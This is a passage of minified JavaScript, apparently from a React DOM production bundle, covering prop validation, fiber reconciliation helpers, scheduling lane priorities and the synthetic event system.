Vr(e,n){if(n){if(Yp[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(j(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(j(60));if(typeof n.dangerouslySetInnerHTML!="object"||!("__html"in n.dangerouslySetInnerHTML))throw Error(j(61))}if(n.style!=null&&typeof n.style!="object")throw Error(j(62))}}function Gr(e,n){if(e.indexOf("-")===-1)return typeof n.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Kr=null;function Hi(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Yr=null,vt=null,yt=null;function el(e){if(e=_s(e)){if(typeof Yr!="function")throw Error(j(280));var n=e.stateNode;n&&(n=za(n),Yr(e.stateNode,e.type,n))}}function Jc(e){vt?yt?yt.push(e):yt=[e]:vt=e}function Zc(){if(vt){var e=vt,n=yt;if(yt=vt=null,el(e),n)for(e=0;e<n.length;e++)el(n[e])}}function eu(e,n){return e(n)}function nu(){}var rr=!1;function tu(e,n,t){if(rr)return e(n,t);rr=!0;try{return eu(e,n,t)}finally{rr=!1,(vt!==null||yt!==null)&&(nu(),Zc())}}function is(e,n){var t=e.stateNode;if(t===null)return null;var s=za(t);if(s===null)return null;t=s[n];e:switch(n){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(s=!s.disabled)||(e=e.type,s=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!s;break e;default:e=!1}if(e)return null;if(t&&typeof t!="function")throw Error(j(231,n,typeof t));return t}var Xr=!1;if(pn)try{var Ot={};Object.defineProperty(Ot,"passive",{get:function(){Xr=!0}}),window.addEventListener("test",Ot,Ot),window.removeEventListener("test",Ot,Ot)}catch{Xr=!1}function Xp(e,n,t,s,a,r,o,l,c){var d=Array.prototype.slice.call(arguments,3);try{n.apply(t,d)}catch(m){this.onError(m)}}var Xt=!1,ua=null,da=!1,Qr=null,Qp={onError:function(e){Xt=!0,ua=e}};function Jp(e,n,t,s,a,r,o,l,c){Xt=!1,ua=null,Xp.apply(Qp,arguments)}function Zp(e,n,t,s,a,r,o,l,c){if(Jp.apply(this,arguments),Xt){if(Xt){var d=ua;Xt=!1,ua=null}else throw Error(j(198));da||(da=!0,Qr=d)}}function et(e){var n=e,t=e;if(e.alternate)for(;n.return;)n=n.return;else{e=n;do n=e,n.flags&4098&&(t=n.return),e=n.return;while(e)}return n.tag===3?t:null}function su(e){if(e.tag===13){var n=e.memoizedState;if(n===null&&(e=e.alternate,e!==null&&(n=e.memoizedState)),n!==null)return n.dehydrated}return null}function nl(e){if(et(e)!==e)throw Error(j(188))}function eh(e){var n=e.alternate;if(!n){if(n=et(e),n===null)throw Error(j(188));return n!==e?null:e}for(var t=e,s=n;;){var a=t.return;if(a===null)break;var r=a.alternate;if(r===null){if(s=a.return,s!==null){t=s;continue}break}if(a.child===r.child){for(r=a.child;r;){if(r===t)return nl(a),e;if(r===s)return nl(a),n;r=r.sibling}throw Error(j(188))}if(t.return!==s.return)t=a,s=r;else{for(var o=!1,l=a.child;l;){if(l===t){o=!0,t=a,s=r;break}if(l===s){o=!0,s=a,t=r;break}l=l.sibling}if(!o){for(l=r.child;l;){if(l===t){o=!0,t=r,s=a;break}if(l===s){o=!0,s=r,t=a;break}l=l.sibling}if(!o)throw Error(j(189))}}if(t.alternate!==s)throw Error(j(190))}if(t.tag!==3)throw Error(j(188));return t.stateNode.current===t?e:n}function au(e){return e=eh(e),e!==null?ru(e):null}function ru(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var n=ru(e);if(n!==null)return n;e=e.sibling}return null}var iu=Me.unstable_scheduleCallback,tl=Me.unstable_cancelCallback,nh=Me.unstable_shouldYield,th=Me.unstable_requestPaint,te=Me.unstable_now,sh=Me.unstable_getCurrentPriorityLevel,$i=Me.unstable_ImmediatePriority,ou=Me.unstable_UserBlockingPriority,pa=Me.unstable_NormalPriority,ah=Me.unstable_LowPriority,lu=Me.unstable_IdlePriority,Ra=null,tn=null;function rh(e){if(tn&&typeof tn.onCommitFiberRoot=="function")try{tn.onCommitFiberRoot(Ra,e,void 0,(e.current.flags&128)===128)}catch{}}var Xe=Math.clz32?Math.clz32:lh,ih=Math.log,oh=Math.LN2;function lh(e){return e>>>=0,e===0?32:31-(ih(e)/oh|0)|0}var Ps=64,Is=4194304;function Gt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function ha(e,n){var t=e.pendingLanes;if(t===0)return 0;var s=0,a=e.suspendedLanes,r=e.pingedLanes,o=t&268435455;if(o!==0){var l=o&~a;l!==0?s=Gt(l):(r&=o,r!==0&&(s=Gt(r)))}else o=t&~a,o!==0?s=Gt(o):r!==0&&(s=Gt(r));if(s===0)return 0;if(n!==0&&n!==s&&!(n&a)&&(a=s&-s,r=n&-n,a>=r||a===16&&(r&4194240)!==0))return n;if(s&4&&(s|=t&16),n=e.entangledLanes,n!==0)for(e=e.entanglements,n&=s;0<n;)t=31-Xe(n),a=1<<t,s|=e[t],n&=~a;return s}function ch(e,n){switch(e){case 1:case 2:case 4:return n+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return n+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function uh(e,n){for(var t=e.suspendedLanes,s=e.pingedLanes,a=e.expirationTimes,r=e.pendingLanes;0<r;){var o=31-Xe(r),l=1<<o,c=a[o];c===-1?(!(l&t)||l&s)&&(a[o]=ch(l,n)):c<=n&&(e.expiredLanes|=l),r&=~l}}function Jr(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function cu(){var e=Ps;return Ps<<=1,!(Ps&4194240)&&(Ps=64),e}function ir(e){for(var n=[],t=0;31>t;t++)n.push(e);return n}function Ts(e,n,t){e.pendingLanes|=n,n!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,n=31-Xe(n),e[n]=t}function dh(e,n){var t=e.pendingLanes&~n;e.pendingLanes=n,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=n,e.mutableReadLanes&=n,e.entangledLanes&=n,n=e.entanglements;var s=e.eventTimes;for(e=e.expirationTimes;0<t;){var a=31-Xe(t),r=1<<a;n[a]=0,s[a]=-1,e[a]=-1,t&=~r}}function Wi(e,n){var t=e.entangledLanes|=n;for(e=e.entanglements;t;){var s=31-Xe(t),a=1<<s;a&n|e[s]&n&&(e[s]|=n),t&=~a}}var $=0;function uu(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var du,Vi,pu,hu,mu,Zr=!1,Ms=[],_n=null,Nn=null,Cn=null,os=new Map,ls=new Map,kn=[],ph="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function sl(e,n){switch(e){case"focusin":case"focusout":_n=null;break;case"dragenter":case"dragleave":Nn=null;break;case"mouseover":case"mouseout":Cn=null;break;case"pointerover":case"pointerout":os.delete(n.pointerId);break;case"gotpointercapture":case"lostpointercapture":ls.delete(n.pointerId)}}function qt(e,n,t,s,a,r){return e===null||e.nativeEvent!==r?(e={blockedOn:n,domEventName:t,eventSystemFlags:s,nativeEvent:r,targetContainers:[a]},n!==null&&(n=_s(n),n!==null&&Vi(n)),e):(e.eventSystemFlags|=s,n=e.targetContainers,a!==null&&n.indexOf(a)===-1&&n.push(a),e)}function hh(e,n,t,s,a){switch(n){case"focusin":return _n=qt(_n,e,n,t,s,a),!0;case"dragenter":return Nn=qt(Nn,e,n,t,s,a),!0;case"mouseover":return Cn=qt(Cn,e,n,t,s,a),!0;case"pointerover":var r=a.pointerId;return os.set(r,qt(os.get(r)||null,e,n,t,s,a)),!0;case"gotpointercapture":return r=a.pointerId,ls.set(r,qt(ls.get(r)||null,e,n,t,s,a)),!0}return!1}function fu(e){var n=Bn(e.target);if(n!==null){var t=et(n);if(t!==null){if(n=t.tag,n===13){if(n=su(t),n!==null){e.blockedOn=n,mu(e.priority,function(){pu(t)});return}}else if(n===3&&t.stateNode.current.memoizedState.isDehydrated){e.blockedOn=t.tag===3?t.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Qs(e){if(e.blockedOn!==null)return!1;for(var n=e.targetContainers;0<n.length;){var t=ei(e.domEventName,e.eventSystemFlags,n[0],e.nativeEvent);if(t===null){t=e.nativeEvent;var s=new t.constructor(t.type,t);Kr=s,t.target.dispatchEvent(s),Kr=null}else return n=_s(t),n!==null&&Vi(n),e.blockedOn=t,!1;n.shift()}return!0}function al(e,n,t){Qs(e)&&t.delete(n)}function mh(){Zr=!1,_n!==null&&Qs(_n)&&(_n=null),Nn!==null&&Qs(Nn)&&(Nn=null),Cn!==null&&Qs(Cn)&&(Cn=null),os.forEach(al),ls.forEach(al)}function Dt(e,n){e.blockedOn===n&&(e.blockedOn=null,Zr||(Zr=!0,Me.unstable_scheduleCallback(Me.unstable_NormalPriority,mh)))}function cs(e){function n(a){return Dt(a,e)}if(0<Ms.length){Dt(Ms[0],e);for(var t=1;t<Ms.length;t++){var s=Ms[t];s.blockedOn===e&&(s.blockedOn=null)}}for(_n!==null&&Dt(_n,e),Nn!==null&&Dt(Nn,e),Cn!==null&&Dt(Cn,e),os.forEach(n),ls.forEach(n),t=0;t<kn.length;t++)s=kn[t],s.blockedOn===e&&(s.blockedOn=null);for(;0<kn.length&&(t=kn[0],t.blockedOn===null);)fu(t),t.blockedOn===null&&kn.shift()}var wt=gn.ReactCurrentBatchConfig,ma=!0;function fh(e,n,t,s){var a=$,r=wt.transition;wt.transition=null;try{$=1,Gi(e,n,t,s)}finally{$=a,wt.transition=r}}function gh(e,n,t,s){var a=$,r=wt.transition;wt.transition=null;try{$=4,Gi(e,n,t,s)}finally{$=a,wt.transition=r}}function Gi(e,n,t,s){if(ma){var a=ei(e,n,t,s);if(a===null)gr(e,n,s,fa,t),sl(e,s);else if(hh(a,e,n,t,s))s.stopPropagation();else if(sl(e,s),n&4&&-1<ph.indexOf(e)){for(;a!==null;){var r=_s(a);if(r!==null&&du(r),r=ei(e,n,t,s),r===null&&gr(e,n,s,fa,t),r===a)break;a=r}a!==null&&s.stopPropagation()}else gr(e,n,s,null,t)}}var fa=null;function ei(e,n,t,s){if(fa=null,e=Hi(s),e=Bn(e),e!==null)if(n=et(e),n===null)e=null;else if(t=n.tag,t===13){if(e=su(n),e!==null)return e;e=null}else if(t===3){if(n.stateNode.current.memoizedState.isDehydrated)return n.tag===3?n.stateNode.containerInfo:null;e=null}else n!==e&&(e=null);return fa=e,null}function gu(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(sh()){case $i:return 1;case ou:return 4;case pa:case ah:return 16;case lu:return 536870912;default:return 16}default:return 16}}var Sn=null,Ki=null,Js=null;function vu(){if(Js)return Js;var e,n=Ki,t=n.length,s,a="value"in Sn?Sn.value:Sn.textContent,r=a.length;for(e=0;e<t&&n[e]===a[e];e++);var o=t-e;for(s=1;s<=o&&n[t-s]===a[r-s];s++);return Js=a.slice(e,1<s?1-s:void 0)}function Zs(e){var n=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&n===13&&(e=13)):e=n,e===10&&(e=13),32<=e||e===13?e:0}function Rs(){return!0}function rl(){return!1}function Oe(e){function n(t,s,a,r,o){this._reactName=t,this._targetInst=a,this.type=s,this.nativeEvent=r,this.target=o,this.currentTarget=null;for(var l in e)e.hasOwnProperty(l)&&(t=e[l],this[l]=t?t(r):r[l]);return this.isDefaultPrevented=(r.defaultPrevented!=null?r.defaultPrevented:r.returnValue===!1)?Rs:rl,this.isPropagationStopped=rl,this}return Z(n.prototype,{preventDefault:function(){this.defaultPrevented=!0;var t=this.nativeEvent;t&&(t.preventDefault?t.preventDefault():typeof t.returnValue!="unknown"&&(t.returnValue=!1),this.isDefaultPrevented=Rs)},stopPropagation:function(){var t=this.nativeEvent;t&&(t.stopPropagation?t.stopPropagation():typeof t.cancelBubble!="unknown"&&(t.cancelBubble=!0),this.isPropagationStopped=Rs)},persist:function(){},isPersistent:Rs}),n}var Pt={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Yi=Oe(Pt),Es=Z({},Pt,{view:0,detail:0}),vh=Oe(Es),or,lr,zt,Oa=Z({},Es,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:Xi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==zt&&(zt&&e.type==="mousemove"?(or=e.screenX-zt.screenX,lr=e.screenY-zt.screenY):lr=or=0,zt=e),or)},movementY:function(e){return"movementY"in e?e.movementY:lr}}),il=Oe(Oa),yh=Z({},Oa,{dataTransfer:0}),wh=Oe(yh),bh=Z({},Es,{relatedTarget:0}),cr=Oe(bh),kh=Z({},Pt,{animationName:0,elapsedTime:0,pseudoElement:0}),xh=Oe(kh),Sh=Z({},Pt,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),Th=Oe(Sh),Eh=Z({},Pt,{data:0}),ol=Oe(Eh),_h={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Nh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},Ch={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function jh(e){var n=this.nativeEvent;return n.getModifierState?n.getModifierState(e):(e=Ch[e])?!!n[e]:!1}function Xi(){return jh}var Lh=Z({},Es,{key:function(e){if(e.key){var n=_h[e.key]||e.key;if(n!=="Unidentified")return n}return e.type==="keypress"?(e=Zs(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Nh[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Xi,charCode:function(e){return e.type==="keypress"?Zs(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Zs(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),Ah=Oe(Lh),Ph=Z({},Oa,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),ll=Oe(Ph),Ih=Z({},Es,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Xi}),Mh=Oe(Ih),Rh=Z({},Pt,{propertyName:0,elapsedTime:0,pseudoElement:0}),Oh=Oe(Rh),qh=Z({},Oa,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Dh=Oe(qh),zh=[9,13,27,32],Qi=pn&&"CompositionEvent"in window,Qt=null;pn&&"documentMode"in document&&(Qt=document.documentMode);var Fh=pn&&"TextEvent"in window&&!Qt,yu=pn&&(!Qi||Qt&&8<Qt&&11>=Qt),cl=" ",ul=!1;function wu(e,n){switch(e){case"keyup":return zh.indexOf(n.keyCode)!==-1;case"keydown":return n.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function bu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var rt=!1;function Uh(e,n){switch(e){case"compositionend":return bu(n);case"keypress":return n.which!==32?null:(ul=!0,cl);case"textInput":return e=n.data,e===cl&&ul?null:e;default:return null}}function Bh(e,n){if(rt)return e==="compositionend"||!Qi&&wu(e,n)?(e=vu(),Js=Ki=Sn=null,rt=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(n.ctrlKey||n.altKey||n.metaKey)||n.ctrlKey&&n.altKey){if(n.char&&1<n.char.length)return n.char;if(n.which)return String.fromCharCode(n.which)}return null;case"compositionend":return yu&&n.locale!=="ko"?null:n.data;default:return null}}var Hh={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function dl(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n==="input"?!!Hh[e.type]:n==="textarea"}function ku(e,n,t,s){Jc(s),n=ga(n,"onChange"),0<n.length&&(t=new Yi("onChange","change",null,t,s),e.push({event:t,listeners:n}))}var Jt=null,us=null;function $h(e){Pu(e,0)}function qa(e){var n=lt(e);if(Wc(n))return e}function Wh(e,n){if(e==="change")return n}var xu=!1;if(pn){var ur;if(pn){var dr="oninput"in document;if(!dr){var pl=document.createElement("div");pl.setAttribute("oninput","return;"),dr=typeof pl.oninput=="function"}ur=dr}else ur=!1;xu=ur&&(!document.documentMode||9<document.documentMode)}function hl(){Jt&&(Jt.detachEvent("onpropertychange",Su),us=Jt=null)}function Su(e){if(e.propertyName==="value"&&qa(us)){var n=[];ku(n,us,e,Hi(e)),tu($h,n)}}function Vh(e,n,t){e==="focusin"?(hl(),Jt=n,us=t,Jt.attachEvent("onpropertychange",Su)):e==="focusout"&&hl()}function Gh(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return qa(us)}function Kh(e,n){if(e==="click")return qa(n)}function Yh(e,n){if(e==="input"||e==="change")return qa(n)}function Xh(e,n){return e===n&&(e!==0||1/e===1/n)||e!==e&&n!==n}var Je=typeof Object.is=="function"?Object.is:Xh;function ds(e,n){if(Je(e,n))return!0;if(typeof e!="object"||e===null||typeof n!="object"||n===null)return!1;var t=Object.keys(e),s=Object.keys(n);if(t.length!==s.length)return!1;for(s=0;s<t.length;s++){var a=t[s];if(!Or.call(n,a)||!Je(e[a],n[a]))return!1}return!0}function ml(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function fl(e,n){var t=ml(e);e=0;for(var s;t;){if(t.nodeType===3){if(s=e+t.textContent.length,e<=n&&s>=n)return{node:t,offset:n-e};e=s}e:{for(;t;){if(t.nextSibling){t=t.nextSibling;break e}t=t.parentNode}t=void 0}t=ml(t)}}function Tu(e,n){return e&&n?e===n?!0:e&&e.nodeType===3?!1:n&&n.nodeType===3?Tu(e,n.parentNode):"contains"in e?e.contains(n):e.compareDocumentPosition?!!(e.compareDocumentPosition(n)&16):!1:!1}function Eu(){for(var e=window,n=ca();n instanceof e.HTMLIFrameElement;){try{var t=typeof n.contentWindow.location.href=="string"}catch{t=!1}if(t)e=n.contentWindow;else break;n=ca(e.document)}return n}function Ji(e){var n=e&&e.nodeName&&e.nodeName.toLowerCase();return n&&(n==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||n==="textarea"||e.contentEditable==="true")}function Qh(e){var n=Eu(),t=e.focusedElem,s=e.selectionRange;if(n!==t&&t&&t.ownerDocument&&Tu(t.ownerDocument.documentElement,t)){if(s!==null&&Ji(t)){if(n=s.start,e=s.end,e===void 0&&(e=n),"selectionStart"in t)t.selectionStart=n,t.selectionEnd=Math.min(e,t.value.length);else if(e=(n=t.ownerDocument||document)&&n.defaultView||window,e.getSelection){e=e.getSelection();var a=t.textContent.length,r=Math.min(s.start,a);s=s.end===void 0?r:Math.min(s.end,a),!e.extend&&r>s&&(a=s,s=r,r=a),a=fl(t,r);var o=fl(t,s);a&&o&&(e.rangeCount!==1||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==o.node||e.focusOffset!==o.offset)&&(n=n.createRange(),n.setStart(a.node,a.offset),e.removeAllRanges(),r>s?(e.addRange(n),e.extend(o.node,o.offset)):(n.setEnd(o.node,o.offset),e.addRange(n)))}}for(n=[],e=t;e=e.parentNode;)e.nodeType===1&&n.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof t.focus=="function"&&t.focus(),t=0;t<n.length;t++)e=n[t],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Jh=pn&&"documentMode"in document&&11>=document.documentMode,it=null,ni=null,Zt=null,ti=!1;function gl(e,n,t){var s=t.window===t?t.document:t.nodeType===9?t:t.ownerDocument;ti||it==null||it!==ca(s)||(s=it,"selectionStart"in s&&Ji(s)?s={start:s.selectionStart,end:s.selectionEnd}:(s=(s.ownerDocument&&s.ownerDocument.defaultView||window).getSelection(),s={anchorNode:s.anchorNode,anchorOffset:s.anchorOffset,focusNode:s.focusNode,focusOffset:s.focusOffset}),Zt&&ds(Zt,s)||(Zt=s,s=ga(ni,"onSelect"),0<s.length&&(n=new Yi("onSelect","select",null,n,t),e.push({event:n,listeners:s}),n.target=it)))}function Os(e,n){var t={};return t[e.toLowerCase()]=n.toLowerCase(),t["Webkit"+e]="webkit"+n,t["Moz"+e]="moz"+n,t}var ot={animationend:Os("Animation","AnimationEnd"),animationiteration:Os("Animation","AnimationIteration"),animationstart:Os("Animation","AnimationStart"),transitionend:Os("Transition","TransitionEnd")},pr={},_u={};pn&&(_u=document.createElement("div").style,"AnimationEvent"in window||(delete ot.animationend.animation,delete ot.animationiteration.animation,delete ot.animationstart.animation),"TransitionEvent"in window||delete ot.transitionend.transition);function Da(e){if(pr[e])return pr[e];if(!ot[e])return e;var n=ot[e],t;for(t in n)if(n.hasOwnProperty(t)&&t in _u)return pr[e]=n[t];return e}var Nu=Da("animationend"),Cu=Da("animationiteration"),ju=Da("animationstart"),Lu=Da("transitionend"),Au=new Map,vl="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function qn(e,n){Au.set(e,n),Zn(n,[e])}for(var hr=0;hr<vl.length;hr++){var mr=vl[hr],Zh=mr.toLowerCase(),em=mr[0].toUpperCase()+mr.slice(1);qn(Zh,"on"+em)}qn(Nu,"onAnimationEnd");qn(Cu,"onAnimationIteration");qn(ju,"onAnimationStart");qn("dblclick","onDoubleClick");qn("focusin","onFocus");qn("focusout","onBlur");qn(Lu,"onTransitionEnd");St("onMouseEnter",["mouseout","mouseover"]);St("onMouseLeave",["mouseout","mouseover"]);St("onPointerEnter",["pointerout","pointerover"]);St("onPointerLeave",["pointerout","pointerover"]);Zn("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Zn("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Zn("onBeforeInput",["compositionend","keypress","textInput","paste"]);Zn("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Zn("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Zn("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Kt="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),nm=new Set("cancel close invalid load scroll toggle".split(" ").concat(Kt));function yl(e,n,t){var s=e.type||"unknown-event";e.currentTarget=t,Zp(s,n,void 0,e),e.currentTarget=null}function Pu(e,n){n=(n&4)!==0;for(var t=0;t<e.length;t++){var s=e[t],a=s.event;s=s.listeners;e:{var r=void 0;if(n)for(var o=s.length-1;0<=o;o--){var l=s[o],c=l.instance,d=l.currentTarget;if(l=l.listener,c!==r&&a.isPropagationStopped())break e;yl(a,l,d),r=c}else for(o=0;o<s.length;o++){if(l=s[o],c=l.instance,d=l.currentTarget,l=l.listener,c!==r&&a.isPropagationStopped())break e;yl(a,l,d),r=c}}}if(da)throw e=Qr,da=!1,Qr=null,e}function V(e,n){var t=n[oi];t===void 0&&(t=n[oi]=new Set);var s=e+"__bubble";t.has(s)||(Iu(n,e,2,!1),t.add(s))}function fr(e,n,t){var s=0;n&&(s|=4),Iu(t,e,s,n)}var qs="_reactListening"+Math.random().toString(36).slice(2);function ps(e){if(!e[qs]){e[qs]=!0,Fc.forEach(function(t){t!=="selectionchange"&&(nm.has(t)||fr(t,!1,e),fr(t,!0,e))});var n=e.nodeType===9?e:e.ownerDocument;n===null||n[qs]||(n[qs]=!0,fr("selectionchange",!1,n))}}function Iu(e,n,t,s){switch(gu(n)){case 1:var a=fh;break;case 4:a=gh;break;default:a=Gi}t=a.bind(null,n,t,e),a=void 0,!Xr||n!=="touchstart"&&n!=="touchmove"&&n!=="wheel"||(a=!0),s?a!==void 0?e.addEventListener(n,t,{capture:!0,passive:a}):e.addEventListener(n,t,!0):a!==void 0?e.addEventListener(n,t,{passive:a}):e.addEventListener(n,t,!1)}function gr(e,n,t,s,a){var r=s;if(!(n&1)&&!(n&2)&&s!==null)e:for(;;){if(s===null)return;var o=s.tag;if(o===3||o===4){var l=s.stateNode.containerInfo;if(l===a||l.nodeType===8&&l.parentNode===a)break;if(o===4)for(o=s.return;o!==null;){var c=o.tag;if((c===3||c===4)&&(c=o.stateNode.containerInfo,c===a||c.nodeType===8&&c.parentNode===a))return;o=o.return}for(;l!==null;){if(o=Bn(l),o===null)return;if(c=o.tag,c===5||c===6){s=r=o;continue e}l=l.parentNode}}s=s.return}tu(function(){var d=r,m=Hi(t),p=[];e:{var v=Au.get(e);if(v!==void 0){var b=Yi,w=e;switch(e){case"keypress":if(Zs(t)===0)break e;case"keydown":case"keyup":b=Ah;break;case"focusin":w="focus",b=cr;break;case"focusout":w="blur",b=cr;break;case"beforeblur":case"afterblur":b=cr;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":b=il;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":b=wh;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":b=Mh;break;case Nu:case Cu:case ju:b=xh;break;case Lu:b=Oh;break;case"scroll":b=vh;break;case"wheel":b=Dh;break;case"copy":case"cut":case"paste":b=Th;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":b=ll}var y=(n&4)!==0,T=!y&&e==="scroll",f=y?v!==null?v+"Capture":null:v;y=[];for(var u=d,h;u!==null;){h=u;var x=h.stateNode;if(h.tag===5&&x!==null&&(h=x,f!==null&&(x=is(u,f),x!=null&&y.push(hs(u,x,h)))),T)break;u=u.return}0<y.length&&(v=new b(v,w,null,t,m),p.push({event:v,listeners:y}))}}if(!(n&7)){e:{if(v=e==="mouseover"||e==="pointerover",b=e==="mouseout"||e==="pointerout",v&&t!==Kr&&(w=t.relatedTarget||t.fromElement)&&(Bn(w)||w[hn]))break 